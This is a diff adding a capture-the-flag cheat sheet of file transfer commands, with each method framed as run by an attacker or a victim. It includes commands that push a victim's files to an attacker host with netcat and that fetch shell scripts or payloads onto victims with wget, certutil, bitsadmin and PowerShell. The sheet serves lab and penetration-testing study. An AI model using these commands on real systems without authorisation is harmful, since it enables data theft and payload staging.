@@ -1,0 +1,307 @@
+====================================================
+COMMON FILE TRANSFER METHODS (LINUX & WINDOWS)
+====================================================
+
+Replace:
+LHOST = Your Attacker IP
+
+Example:
+LHOST=10.10.14.10
+
+====================================================
+1. PYTHON HTTP SERVER (Most Common)
+====================================================
+
+Attacker
+
+python3 -m http.server 8000
+
+Victim
+
+wget http://LHOST:8000/file
+
+curl http://LHOST:8000/file -o file
+
+====================================================
+2. PYTHON HTTP SERVER (Python 2)
+====================================================
+
+Attacker
+
+python -m SimpleHTTPServer 8000
+
+====================================================
+3. WGET
+====================================================
+
+wget http://LHOST:8000/file
+
+wget -O shell.sh http://LHOST:8000/shell.sh
+
+====================================================
+4. CURL
+====================================================
+
+curl http://LHOST:8000/file -o file
+
+curl -O http://LHOST:8000/file
+
+====================================================
+5. SCP
+====================================================
+
+Upload
+
+scp file user@TARGET:/tmp/
+
+Download
+
+scp user@TARGET:/tmp/file .
+
+====================================================
+6. SFTP
+====================================================
+
+sftp user@TARGET
+
+put file
+
+get file
+
+====================================================
+7. NETCAT (ATTACKER SENDS)
+====================================================
+
+Attacker
+
+nc -lvnp 4444 < file
+
+Victim
+
+nc LHOST 4444 > file
+
+====================================================
+8. NETCAT (VICTIM SENDS)
+====================================================
+
+Victim
+
+nc ATTACKER_IP 4444 < file
+
+Attacker
+
+nc -lvnp 4444 > file
+
+====================================================
+9. SOCAT
+====================================================
+
+Attacker
+
+socat TCP-LISTEN:4444,fork FILE:file
+
+Victim
+
+socat TCP:LHOST:4444 OPEN:file,creat
+
+====================================================
+10. BASE64
+====================================================
+
+Victim
+
+base64 file
+
+Attacker
+
+echo "<base64>" | base64 -d > file
+
+====================================================
+11. FTP
+====================================================
+
+ftp LHOST
+
+put file
+
+get file
+
+====================================================
+12. SMB
+====================================================
+
+Attacker (Impacket)
+
+impacket-smbserver share . -smb2support
+
+Victim (Linux)
+
+mount -t cifs //LHOST/share /mnt
+
+cp file /mnt/
+
+Victim (Windows)
+
+copy file \\LHOST\share\
+
+====================================================
+13. NFS
+====================================================
+
+Attacker
+
+Export directory
+
+Victim
+
+mount LHOST:/share /mnt
+
+====================================================
+14. SSH CAT
+====================================================
+
+Upload
+
+cat file | ssh user@TARGET "cat > /tmp/file"
+
+Download
+
+ssh user@TARGET "cat /tmp/file" > file
+
+====================================================
+15. PYTHON SIMPLE DOWNLOAD
+====================================================
+
+python3 -c "import urllib.request;urllib.request.urlretrieve('http://LHOST:8000/file','file')"
+
+====================================================
+16. PERL DOWNLOAD
+====================================================
+
+perl -e 'use LWP::Simple;getstore("http://LHOST:8000/file","file");'
+
+====================================================
+17. PHP DOWNLOAD
+====================================================
+
+php -r 'file_put_contents("file",file_get_contents("http://LHOST:8000/file"));'
+
+====================================================
+18. WINDOWS CERTUTIL
+====================================================
+
+certutil -urlcache -split -f http://LHOST:8000/file file
+
+====================================================
+19. WINDOWS POWERSHELL
+====================================================
+
+powershell -c "Invoke-WebRequest http://LHOST:8000/file -OutFile file"
+
+====================================================
+20. WINDOWS BITSADMIN
+====================================================
+
+bitsadmin /transfer job http://LHOST:8000/file C:\Users\Public\file
+
+====================================================
+21. WINDOWS SMB COPY
+====================================================
+
+copy file \\LHOST\share\
+
+xcopy file \\LHOST\share\
+
+====================================================
+22. OPENSSL
+====================================================
+
+Attacker
+
+openssl s_server -quiet -accept 4444 -cert cert.pem -key key.pem < file
+
+Victim
+
+openssl s_client -connect LHOST:4444 > file
+
+====================================================
+23. TFTP
+====================================================
+
+tftp LHOST
+
+get file
+
+====================================================
+24. RSYNC
+====================================================
+
+Download
+
+rsync -avz user@TARGET:/tmp/file .
+
+Upload
+
+rsync -avz file user@TARGET:/tmp/
+
+====================================================
+25. ZIP & TAR
+====================================================
+
+zip archive.zip file
+
+tar -czvf archive.tar.gz folder
+
+====================================================
+26. VERIFY FILE
+====================================================
+
+md5sum file
+
+sha1sum file
+
+sha256sum file
+
+====================================================
+CTF QUICK REFERENCE
+====================================================
+
+✓ python3 -m http.server 8000
+✓ wget
+✓ curl
+✓ certutil
+✓ powershell Invoke-WebRequest
+✓ nc
+✓ scp
+✓ sftp
+✓ impacket-smbserver
+✓ ftp
+✓ base64
+✓ rsync
+
+====================================================
+MOST USED DURING CTFs
+====================================================
+
+★★★★★ python3 -m http.server
+
+★★★★★ wget
+
+★★★★★ curl
+
+★★★★★ certutil
+
+★★★★★ Invoke-WebRequest
+
+★★★★☆ scp
+
+★★★★☆ nc
+
+★★★★☆ impacket-smbserver
+
+★★★☆☆ ftp
+
+★★★☆☆ sftp
+
+====================================================
+```
